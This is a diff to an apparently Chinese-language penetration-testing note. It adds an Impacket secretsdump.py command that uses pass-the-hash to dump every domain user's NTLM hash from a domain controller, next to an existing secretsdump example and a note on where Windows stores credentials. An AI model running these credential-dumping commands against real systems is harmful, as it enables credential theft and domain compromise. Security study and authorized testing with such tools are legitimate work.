@@ -109,6 +109,10 @@ connection:
 python secretsdump.py domain/username@10.10.10.10 -hashes LM HASH:NT HASH 
 ```
 secretsdump.py主要从SAM、LSA secrets(包括 cached creds)和域控的NTDS.dit三处获取用户凭证，唯一的一点是不能dump LSASS进程在内存中的数据。  
+导出域控所有用户hash  
+```
+python secretsdump.py domain/username@10.10.10.10 -hashes LM HASH:NT HASH  -just-dc-ntlm -outputfile tmp
+```
 
 ### \#0x01 用户凭证在windows系统如何存储:
 查看微软官方的说明
